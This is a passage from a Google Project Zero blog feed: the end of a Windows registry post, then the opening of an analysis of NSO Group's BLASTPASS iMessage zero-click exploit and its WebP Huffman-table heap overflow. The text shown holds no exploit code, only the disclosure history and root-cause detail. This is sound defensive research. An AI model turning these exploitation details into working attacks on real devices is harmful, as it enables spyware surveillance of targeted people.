 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span&gt;The goal of this post was to provide a thorough overview of the structures used in the Configuration Manager subsystem in Windows, with particular emphasis on the most important and frequently used ones, i.e. those describing hives and keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I wanted to share this knowledge because there are not many publicly available sources that accurately describe the registry&amp;#39;s operation from the implementation side, especially relevant to the most recent code developments in Windows 10 and 11.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I would also like to once again use this opportunity to appeal to Microsoft to make more information available through public PDB symbols &amp;ndash; this would greatly facilitate the work of security researchers in the future.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;This post concludes the part of the series focusing solely on the inner workings of the registry.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In the next, seventh installment, &lt;/span&gt;&lt;span&gt;we will shift our perspective and examine the registry&amp;#39;s role in the overall security of the system, with a deep focus on vulnerability research. &lt;/span&gt;&lt;span&gt;Stay tuned!&lt;/span&gt;&lt;/p&gt;
</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/8554525684674118908/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/8554525684674118908'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/8554525684674118908'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html' title='The Windows Registry Adventure #6: Kernel-mode objects'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIE8uHd2DJ-gPQVj9KpjdpoVP-aLCdRXjAU0lIpKprgSI3KpFkoomVyU2PvhTA3zp_8ha28xuZUoXTTKKJjyevXRUf2NQ_NaJlHMoPx91KfE6UBsoyKl-VnRbA73_AjPxTf4ZXasUNMAwMKh3kc9VTWczg0ua_9ltU9G1BK7I4xEIHpJ9ubrxah9Jds5U/s72-c/image1.png" height="72" width="72"/><thr:total>0</thr:total></entry><entry><id>tag:blogger.com,1999:blog-4838136820032157985.post-4442255878341841259</id><published>2025-03-26T10:30:00.000-07:00</published><updated>2025-03-26T10:30:02.152-07:00</updated><title type='text'>Blasting Past Webp</title><content type='html'>&lt;style type=&quot;text/css&quot;&gt;@import url(https://themes.googleusercontent.com/fonts/css?kit=XGMkxXUZTA64h2imyzu79g);.lst-kix_t2u4j4vhkrnm-3&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_t2u4j4vhkrnm-0&gt;li:before{content:&quot;\0025cf   &quot;}.lst-kix_t2u4j4vhkrnm-4&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t2u4j4vhkrnm-7&gt;li:before{content:&quot;\0025cb   &quot;}ul.lst-kix_t2u4j4vhkrnm-8{list-style-type:none}ul.lst-kix_t2u4j4vhkrnm-6{list-style-type:none}ul.lst-kix_t2u4j4vhkrnm-7{list-style-type:none}ul.lst-kix_t2u4j4vhkrnm-4{list-style-type:none}.lst-kix_t2u4j4vhkrnm-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_t2u4j4vhkrnm-5{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_t2u4j4vhkrnm-2{list-style-type:none}.lst-kix_t2u4j4vhkrnm-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_t2u4j4vhkrnm-3{list-style-type:none}ul.lst-kix_t2u4j4vhkrnm-0{list-style-type:none}ul.lst-kix_t2u4j4vhkrnm-1{list-style-type:none}.lst-kix_t2u4j4vhkrnm-8&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_t2u4j4vhkrnm-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_t2u4j4vhkrnm-2&gt;li:before{content:&quot;\0025a0   &quot;}ol{margin:0;padding:0}table td,table th{padding:0}.XQFzMDWmii-c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:234pt;border-top-color:#000000;border-bottom-style:solid}.XQFzMDWmii-c36{padding-top:0pt;border-top-width:0pt;padding-bottom:0pt;line-height:1.5;border-top-style:solid;background-color:#ffffff;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left}.XQFzMDWmii-c40{padding-top:14pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.XQFzMDWmii-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:&quot;Arial&quot;;font-style:normal}.XQFzMDWmii-c22{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:&quot;Arial&quot;;font-style:normal}.XQFzMDWmii-c35{color:#666666;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:&quot;Arial&quot;;font-style:normal}.XQFzMDWmii-c18{color:#434343;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:14pt;font-family:&quot;Arial&quot;;font-style:normal}.XQFzMDWmii-c38{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.XQFzMDWmii-c12{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.XQFzMDWmii-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.XQFzMDWmii-c10{color:#000000;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.XQFzMDWmii-c29{color:#b80672;text-decoration:none;vertical-align:baseline;font-size:11pt;font-style:normal}.XQFzMDWmii-c11{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left;margin-right:-72pt}.XQFzMDWmii-c21{color:#000000;vertical-align:baseline;font-size:11pt;font-style:normal}.XQFzMDWmii-c17{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.XQFzMDWmii-c1{font-size:9pt;font-family:&quot;Roboto Mono&quot;;color:#188038;font-weight:400}.XQFzMDWmii-c42{color:#666666;vertical-align:baseline;font-size:15pt;font-style:normal}.XQFzMDWmii-c45{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.XQFzMDWmii-c3{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.XQFzMDWmii-c41{border-spacing:0;border-collapse:collapse;margin-right:auto}.XQFzMDWmii-c37{font-weight:400;text-decoration:none;font-family:&quot;Arial&quot;}.XQFzMDWmii-c2{color:#1967d2;font-weight:400;font-family:&quot;Roboto Mono&quot;}.XQFzMDWmii-c26{color:#000000;vertical-align:baseline;font-size:11pt}.XQFzMDWmii-c5{color:#37474f;font-weight:400;font-family:&quot;Roboto Mono&quot;}.XQFzMDWmii-c39{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.XQFzMDWmii-c13{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;text-decoration:underline}.XQFzMDWmii-c16{background-color:#00ff00;font-style:italic}.XQFzMDWmii-c9{font-weight:400;font-family:&quot;Courier New&quot;}.XQFzMDWmii-c23{font-weight:700;font-family:&quot;Courier New&quot;}.XQFzMDWmii-c6{font-weight:400;font-family:&quot;Roboto Mono&quot;}.XQFzMDWmii-c19{background-color:#ffff00}.XQFzMDWmii-c32{background-color:#00ff00}.XQFzMDWmii-c15{background-color:#ff9900}.XQFzMDWmii-c24{font-style:italic}.XQFzMDWmii-c25{font-weight:700}.XQFzMDWmii-c20{font-size:10pt}.XQFzMDWmii-c8{font-size:9pt}.XQFzMDWmii-c43{padding-left:0pt}.XQFzMDWmii-c44{color:#c5221f}.XQFzMDWmii-c28{height:0pt}.XQFzMDWmii-c31{background-color:#f4cccc}.XQFzMDWmii-c14{background-color:#ff00ff}.XQFzMDWmii-c34{margin-left:36pt}.XQFzMDWmii-c27{color:#188038}.XQFzMDWmii-c7{height:11pt}.XQFzMDWmii-c33{background-color:#00ffff}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c39 doc-content&quot;&gt;
 &lt;p class=&quot;c38 subtitle&quot; id=&quot;h.7totxo172g4m&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c37 XQFzMDWmii-c42&quot;&gt;An analysis of the NSO BLASTPASS iMessage exploit&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c36&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c22&quot;&gt;Posted by Ian Beer, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;On September 7, 2023 Apple &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://support.apple.com/en-us/106361&quot;&gt;issued&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;an out-of-band security update for iOS:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpVzqhKSxPZc0TxpxC_Ka4_MVC3fJD4u9HbPMnh5jE4_tLYK08va_RroD4K3PkzOHV5SLJa8ovjXtUpF5FJRaA2SBW-SFv4fELlDeF8kEznmeBu4Zzi-kV_AMIlQLXBZTgUj9s6WQvkpE041lbp2XmSqGkj4u49X9EQOdNCeum_m1acT1HAul-xsuToi0/s1748/image8.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpVzqhKSxPZc0TxpxC_Ka4_MVC3fJD4u9HbPMnh5jE4_tLYK08va_RroD4K3PkzOHV5SLJa8ovjXtUpF5FJRaA2SBW-SFv4fELlDeF8kEznmeBu4Zzi-kV_AMIlQLXBZTgUj9s6WQvkpE041lbp2XmSqGkj4u49X9EQOdNCeum_m1acT1HAul-xsuToi0/s1200/image8.png&quot; border=&quot;0&quot; alt=&quot;Release notes for iOS 16.6.1 and iPadOS 16.6.1, including CVE-2023-41064 for ImageIO and CVE-2023-41061 for Wallet, detailing security updates and potential exploitation.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Release notes for iOS 16.6.1 and iPadOS 16.6.1, including CVE-2023-41064 for ImageIO and CVE-2023-41061 for Wallet, detailing security updates and potential exploitation.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Around the same time on September 7th 2023, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://citizenlab.ca/2023/09/blastpass-nso-group-iphone-zero-click-zero-day-exploit-captured-in-the-wild/&quot;&gt;Citizen Lab published a blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;linking the two CVEs fixed in iOS 16.6.1 to an &amp;quot;NSO Group Zero-Click, Zero-Day exploit captured in the wild&amp;quot;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c37 XQFzMDWmii-c26 XQFzMDWmii-c24&quot;&gt;[The target was] an individual employed by a Washington DC-based civil society organization with international offices...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c37 XQFzMDWmii-c26 XQFzMDWmii-c24&quot;&gt;The exploit chain was capable of compromising iPhones running the latest version of iOS (16.6) without any interaction from the victim.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c37 XQFzMDWmii-c26 XQFzMDWmii-c24&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c26 XQFzMDWmii-c24 XQFzMDWmii-c37&quot;&gt;The exploit involved PassKit attachments containing malicious images sent from an attacker iMessage account to the victim.&amp;quot;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The day before, on September 6th 2023, Apple &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://issues.chromium.org/issues/40071416&quot;&gt;reported a vulnerability to the WebP project&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, indicating in the report that they planned to ship a custom fix for Apple customers the next day.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The WebP team posted their first &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://chromium.googlesource.com/webm/libwebp/%2B/902bc9190331343b2017211debcec8d2ab87e17a&quot;&gt;proposed fix&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the public git repo the next day, and five days after that on September 12th Google released a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_12.html&quot;&gt;new Chrome stable release&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;containing the WebP fix. Both Apple and Google marked the issue as exploited in the wild, alerting other integrators of WebP that they should rapidly integrate the fix as well as causing the security research community to take a closer look...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;A couple of weeks later on September 21st 2023, former Project Zero team lead Ben Hawkes (in collaboration with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://x.com/mistymntncop&quot;&gt;@mistymntncop&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) published the &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://blog.isosceles.com/the-webp-0day/&quot;&gt;first detailed writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;of the root cause of the vulnerability on the &lt;/span&gt;&lt;span&gt;Isosceles&lt;/span&gt;&lt;span&gt;&amp;nbsp;Blog. A couple of months later, on November 3rd, a group called &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.darknavy.org/&quot;&gt;Dark Navy&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;published their first blog post: a two-part analysis (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_1/&quot;&gt;Part 1&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;- &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_2/&quot;&gt;Part 2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;) of the WebP vulnerability and a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://github.com/DarkNavySecurity/PoC/tree/main/CVE-2023-4863&quot;&gt;proof-of-concept exploit&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;targeting Chrome (CVE-2023-4863).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;Whilst the Isosceles and Dark Navy posts explained the underlying memory corruption vulnerability in great detail, they were unable to solve another fascinating part of the puzzle: just how exactly do you land an exploit for this vulnerability in a one-shot, zero-click setup? As we&amp;#39;ll soon see, the corruption primitive is very limited. Without access to the samples it was almost impossible to know.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;In mid-November, in collaboration with &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://securitylab.amnesty.org/&quot;&gt;Amnesty International Security Lab&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, I was able to obtain a number of BLASTPASS &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/PKPASS&quot;&gt;PKPass&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;sample files as well as crash logs from failed exploit attempts.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;This blog post covers my analysis of those samples and the journey to figure out how one of NSO&amp;#39;s recent zero-click iOS exploits really worked. For me that journey began by immediately taking three months of paternity leave, and resumed in March 2024 where this story begins:&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.l3phtwrgqdig&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c18&quot;&gt;Setting the scene&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;For a detailed analysis of the root-cause of the WebP vulnerability and the primitive it yields, I recommend first reading the three blog posts I mentioned earlier (&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://blog.isosceles.com/the-webp-0day/&quot;&gt;Isosceles&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_1/&quot;&gt;Dark Navy 1&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://www.darknavy.org/blog/exploiting_the_libwebp_vulnerability_part_2/&quot;&gt;Dark Navy 2&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.) I won&amp;#39;t restate their analyses here (both because you should read their original work, and because it&amp;#39;s quite complicated!) Instead I&amp;#39;ll briefly discuss WebP and the corruption &lt;/span&gt;&lt;span&gt;primitive the vulnerability&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;yields.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;XQFzMDWmii-c12&quot; id=&quot;h.115gmx6di0dd&quot;&gt;&lt;span&gt;WebP&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://developers.google.com/speed/webp&quot;&gt;WebP&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a relatively modern image file format, first released in 2010. In reality WebP is actually two completely distinct image formats: &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://developers.google.com/speed/webp/docs/compression%23lossy_webp&quot;&gt;a lossy format&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;based on the VP8 video codec and a separate &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://developers.google.com/speed/webp/docs/compression%23lossless_webp&quot;&gt;lossless format&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. The two formats share nothing apart from both using a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Resource_Interchange_File_Format&quot;&gt;RIFF&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;container and the string &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;WEBP&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the first chunk name. From that point on (12 bytes into the file) they are completely different. The vulnerability is in the lossless format, with the RIFF chunk name &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;VP8L&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;Lossless WebP makes extensive use of &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Huffman_coding&quot;&gt;Huffman coding&lt;/a&gt;&lt;/span&gt;&lt;span&gt;; there are at least 10 huffman trees present in the BLASTPASS sample. In the file they&amp;#39;re stored as &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c3&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Canonical_Huffman_code&quot;&gt;canonical huffman trees&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;, meaning that only the code lengths are retained. At decompression time those lengths are converted directly into a two-level huffman decoding table, with the five largest tables all getting squeezed together into the same pre-allocated buffer. The (it turns out not quite) maximum size of these tables is pre-computed based on the number of symbols they encode. If you&amp;#39;re up to this part and you&amp;#39;re slightly lost, the other three blogposts referenced above explain this in detail.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;With control over the symbol lengths it&amp;#39;s possible to define all sorts of strange trees, many of which aren&amp;#39;t valid. The fundamental issue was that the WebP code only checked the validity of the tree &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;after&lt;/span&gt;&lt;span&gt;&amp;nbsp;building the decoding table. But the pre-computed size of the decoding table was only correct for &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c24&quot;&gt;valid&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;trees.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;As the Isosceles blog post points out, this means that a fundamental part of the vulnerability is that triggering the bug &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c25&quot;&gt;is&lt;/span&gt;&lt;span&gt;&amp;nbsp;detected, though after memory has been corrupted, and image parsing stops only a few lines of code later&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;. This presents another exploitation mystery: in a zero-click context, how do you exploit a bug where every time the issue is triggered it also stops parsing any attacker-controlled data?&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span&gt;The second mystery involves the actual corruption primitive. The vulnerability will write a &lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c9&quot;&gt;HuffmanCode&lt;/span&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&amp;nbsp;structure at a known offset past the end of the huffman tables buffer:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4 XQFzMDWmii-c7&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;// Huffman lookup table entry&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;XQFzMDWmii-c4&quot;&gt;&lt;span class=&quot;XQFzMDWmii-c10 XQFzMDWmii-c9&quot;&gt;typedef struct {&lt;/span&gt;&lt;/p&gt;
